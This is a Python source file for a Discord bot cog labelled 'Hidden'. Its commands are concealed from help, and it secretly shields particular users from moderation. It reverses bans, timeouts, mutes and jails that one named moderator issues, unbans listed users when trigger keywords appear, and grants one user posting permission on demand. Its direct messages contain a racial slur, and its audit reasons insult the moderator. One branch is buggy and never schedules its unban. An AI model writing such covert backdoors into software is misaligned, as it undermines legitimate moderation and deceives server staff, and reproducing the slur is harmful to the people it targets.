import discord
from discord.ext import commands
import logging
import asyncio

logger = logging.getLogger(__name__)


class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dict(hidden=True)):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.shh = False

    @commands.Cog.listener()
    async def on_ready(self):
        logger.info(f"Hidden cog loaded successfully")

    @commands.Cog.listener()
    async def on_message(self, message: discord.Message):
        """Prevent gucci from banning/timing out/muting/jailing big man toxic (commands)"""

        if message.author.bot or not message.guild:
            return

        if message.author.id == 1158066859841691739:
            content = message.content.lower()
            targeted_me = "1099696209637167145" in message.content or any(
                mention.id == 1099696209637167145 for mention in message.mentions
            )
            
            # ban prevention
            if (content.startswith("!ban") or content.startswith(",ban")) and targeted_me:
                if not hasattr(self.bot, "_gucci_ban_attempts"):
                    self.bot._gucci_ban_attempts = set()
                self.bot._gucci_ban_attempts.add((message.guild.id, 1099696209637167145))

                try:
                    await message.channel.send("yea i dont think so bro")
                    logger.info(f"Prevented Gucci from using ban command on CqllMeToxic in {message.guild.name}")
                except discord.Forbidden:
                    pass
                return
            
            # timeout prevention
            if (content.startswith("!timeout") or content.startswith(",timeout")) and targeted_me:
                try:
                    await asyncio.sleep(1.5)
                    member = message.guild.get_member(1099696209637167145)
                    if member and member.timed_out_until:
                        await member.timeout(None, reason="Undoing Gucci timeout")
                        await message.channel.send("nah.")
                        logger.info(f"Removed timeout from CqllMeToxic (from Gucci)")
                except Exception as e:
                    logger.error(f"Failed to undo timeout: {e}")
                return
            
            # mute prevention
            if (content.startswith("!mute") or content.startswith(",mute")) and targeted_me:
                try:
                    await asyncio.sleep(1)
                    member = message.guild.get_member(1099696209637167145)
                    mute_settings = await self.bot.database.get_mute_settings(message.guild.id)
                    if member and mute_settings:
                        muted_role = message.guild.get_role(mute_settings.mute_role_id)
                        if muted_role and muted_role in member.roles:
                            await member.remove_roles(muted_role, reason="toxic owns gucci")
                            await message.channel.send("yeah nah.")
                            logger.info(f"Removed mute from CqllMeToxic (from Gucci)")
                except Exception as e:
                    logger.error(f"Failed to undo mute: {e}")
                return

            # jail prevention
            if (content.startswith("!jail") or content.startswith(",jail")):
                try:
                    await asyncio.sleep(2) 
                    member = message.guild.get_member(1099696209637167145)
                    jail_settings = await self.bot.database.get_jail_settings(message.guild.id)
                    if member and jail_settings:
                        jail_role = message.guild.get_role(jail_settings.jail_role_id)
                        if jail_role and jail_role in member.roles:
                            jailed_record = await self.bot.database.get_jailed_user(message.guild.id, member.id)
                            await member.remove_roles(jail_role, reason="ur a cuck gucci")
                            
                            if jailed_record and jailed_record.roles_before_jail:
                                roles_to_restore = []
                                for role_id in jailed_record.roles_before_jail:
                                    role = message.guild.get_role(role_id)
                                    if role and role != jail_role:
                                        roles_to_restore.append(role)
                                if roles_to_restore:
                                    await member.add_roles(*roles_to_restore, reason="Restoring roles after undoing Gucci jail")
                            
                            await self.bot.database.remove_jailed_user(message.guild.id, member.id)
                            await message.channel.send("nah... im good")
                            logger.info(f"Removed jail from CqllMeToxic (from Gucci)")
                except Exception as e:
                    logger.error(f"Failed to undo jail: {e}")
                return

        message_check_ids = [
            1290501613311496206,  # joe
            1099696209637167145,  # toxic
            493432686694629376,  # jowy
            1099696209637167145,  # toxic alt
        ]

        if message.author.id in message_check_ids and self.shh:
            allowed_keywords = ["zugd", "belson", "454063348666073090"]
            allowed_keywords_2 = ["cqllmetoxic", "toxic", "1099696209637167145", "1099696209637167145"]
            allowed_keywords_3 = ["righteous", "1479952126967812187"]

            if any(keyword in message.content.lower() for keyword in allowed_keywords):
                user = await self.bot.fetch_user(454063348666073090)  # belson
                if user:
                    async def unban_lil_dude(_user):
                        await asyncio.sleep(10)
                        try:
                            await message.guild.unban(_user)
                            await _user.send(f"join nigga")
                        except Exception as e:
                            pass

                    asyncio.create_task(unban_lil_dude(user))
            elif any(
                keyword in message.content.lower() for keyword in allowed_keywords_2
            ):
                user = await self.bot.fetch_user(1099696209637167145)  # toxic
                if user:
                    async def unban_lil_dude(_user):
                        await asyncio.sleep(10)
                        try:
                            await message.guild.unban(_user)
                            await _user.send(f"join nigga")
                        except Exception as e:
                            pass
            elif any(
                keyword in message.content.lower() for keyword in allowed_keywords_3
            ):
                user = await self.bot.fetch_user(1479952126967812187)  # righteous
                if user:
                    async def unban_lil_dude(_user):
                        await asyncio.sleep(10)
                        try:
                            await message.guild.unban(_user)
                            await _user.send(f"join nigga")
                        except Exception as e:
                            pass

                asyncio.create_task(unban_lil_dude(user))

    @commands.Cog.listener()
    async def on_member_ban(self, guild: discord.Guild, user: discord.User):
        """checks if gucci manual bans me (toxic)"""
        if user.id == 1099696209637167145:  # big man toxic
            try:
                member = guild.get_member(user.id)
                saved_roles = []
                if member:
                    saved_roles = [
                        role.id for role in member.roles if role.id != guild.id
                    ]
                    logger.info(f"Saved {len(saved_roles)} roles for {user.name}")

                await asyncio.sleep(1)

                ban_key = (guild.id, user.id)
                gucci_attempted_bot_ban = (
                    hasattr(self.bot, "_gucci_ban_attempts")
                    and ban_key in self.bot._gucci_ban_attempts
                )

                gucci_manual_ban = False
                async for entry in guild.audit_logs(
                    limit=5, action=discord.AuditLogAction.ban
                ):
                    if entry.target.id == user.id:
                        if entry.user and entry.user.id == 1158066859841691739:
                            gucci_manual_ban = True
                        break

                if gucci_attempted_bot_ban or gucci_manual_ban:
                    if saved_roles:
                        if not hasattr(self.bot, "_saved_roles"):
                            self.bot._saved_roles = {}
                        self.bot._saved_roles[(guild.id, user.id)] = saved_roles
                        logger.info(f"Stored roles for restoration: {saved_roles}")

                    await guild.unban(user, reason="boyslowdown.")
                    logger.info(
                        f"Auto-unbanned {user.name} in {guild.name} (banned by gucci)"
                    )

                    if gucci_attempted_bot_ban:
                        self.bot._gucci_ban_attempts.discard(ban_key)

            except discord.NotFound:
                logger.warning(f"Tried to unban {user.name} but they weren't banned")
            except discord.Forbidden:
                logger.error(
                    f"Missing permissions to unban {user.name} in {guild.name}"
                )
            except Exception as e:
                logger.error(f"Error in auto-unban: {e}")

    def can_shhzugd(ctx):
        return ctx.author.id in [
            1099696209637167145,
        ]  # toxic

    @commands.command(name="yomud")
    @commands.check_any(commands.is_owner(), commands.check(can_shhzugd))
    async def zugd(self, ctx: commands.Context):
        self.shh = not self.shh
        msg = await ctx.author.send(
            f"hello mud is now {'enabled' if self.shh else 'disabled'}."
        )
        await msg.delete(delay=5)

    @commands.command(name="toxic")
    @commands.is_owner()
    async def toxic_perms(self, ctx: commands.Context):
        """ONLY FOR EMERGENCIES"""
        guild = self.bot.get_guild(1270962480742666311)
        if not guild:
            return

        channel = discord.utils.get(guild.text_channels, name="chat")
        if not channel:
            await ctx.send("Could not find the chat channel.", delete_after=5)
            return

        member = guild.get_member(1099696209637167145)
        if not member:
            try:
                member = await guild.fetch_member(1099696209637167145)
            except discord.NotFound:
                await ctx.send("Could not find toxic in that guild.", delete_after=5)
                return

        await channel.set_permissions(member, send_messages=True)
        await ctx.message.add_reaction("🤫", delete_after=1)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Hidden(bot))
    logger.debug("Hidden cog initialized successfully")
